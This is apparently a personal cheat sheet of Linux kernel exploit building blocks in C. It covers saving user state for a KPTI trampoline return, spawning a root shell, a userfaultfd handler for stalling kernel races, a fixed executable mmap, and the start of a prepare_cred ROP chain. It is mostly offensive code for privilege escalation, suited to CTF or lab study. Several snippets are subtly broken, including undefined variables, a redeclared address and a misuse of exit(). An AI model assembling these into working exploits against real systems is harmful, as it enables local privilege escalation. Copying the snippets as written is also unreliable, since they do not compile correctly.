*Useful Kernel Snippets*

Save state for KPTI trampoline
```c 
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    printf("[*] Saved state");
}
// System won't work sometimes
void get_shell(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
```



Registering a page fault, Be sure to sleep after registering to allow thread to start polling
```c 
void register_fault(char* addr, size_t len, void *func, int page_flags){
    pthread_t monitor;
    char * addr = mmap(addr, len, page_flags, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.

    if ((uffd= syscall(SYS_userfaultfd, O_NONBLOCK|O_CLOEXEC)) <0){
        printf("Fault Init Failed %ld\n", uffd);
    }
    struct uffdio_api api = {
        .api = UFFD_API,
        .features= 0,
        .ioctls = 0,
    };

    // https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html
    int hand = ioctl(uffd, UFFDIO_API, &api);
    debug_print("API Handshake %d\n", hand);

    struct uffdio_register reg  = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range.len = 0x10000,
        .range.start= (unsigned long long)addr2,
    };

    int regs = ioctl(uffd,UFFDIO_REGISTER , &reg);
    debug_print("Register %d\n", regs);

    printf("[+] Userfault Registered\n");
    int monitor_ret =  pthread_create(&monitor, NULL, func, (void*)uffd);
};


void fault_handler(void * arg){
    puts("[+] Fault monitor thread started");
    int uffd = (long) arg;
    struct pollfd pollfd = {
        .fd = uffd, 
        .events = POLLIN,
    };

    int nready;
    int bytes_read;
    struct uffd_msg msg;

    while(1){
        debug_print("Tryin got poll\n");
        nready = poll(&pollfd,1,-1);
        printf("[+] poll() returns: nready = %d; "
        "POLLIN = %d; POLLERR = %d\n", nready,
        (pollfd.revents & POLLIN) != 0,
        (pollfd.revents & POLLERR) != 0);

        bytes_read = read(uffd, &msg,sizeof(msg));
        debug_print("Read %d bytes\n", bytes_read);

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
        }

        printf("[+] Fault at 0x%llx caught\n", msg.arg.pagefault.address);


        struct uffdio_copy copy= {
            .mode = 0,
            // needs to page aligned 
            .len = 0x1000,
            .dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000- 1),
            .src = (unsigned long)as,
            .copy=0,
        };
        // Stick Exploit HERE


        puts("[+] Releaseing thread");
        // Run copy to unblock
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
            exit("ioctl-UFFDIO_COPY");
    }
}
```


Mmaping Stuff 
```c 
// Map_fix forces to mmap that address, if NULL + no min mmap address returns 0, -1 for FD
mmap(0x5d4a0000, 0x9000000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
```


Creating ROP Chain 
```c 
unsigned long* payload = malloc(0x100); 
*payload++ = pop_rdi;
*payload++ = 0;
*payload++ = prepare_cred;
```

NOTES:
Swap_regs needs stack RAX|RDX|RIP|CS|RFLAGS|SP|SS
Iretq needs stack RIP|CS|RFLAGS|SP|SS

Mapping Exploit Into Container
``` 
-drive file=$1.c,format=raw \
cp /dev/sda /exploit
chmod +x /exploit
```
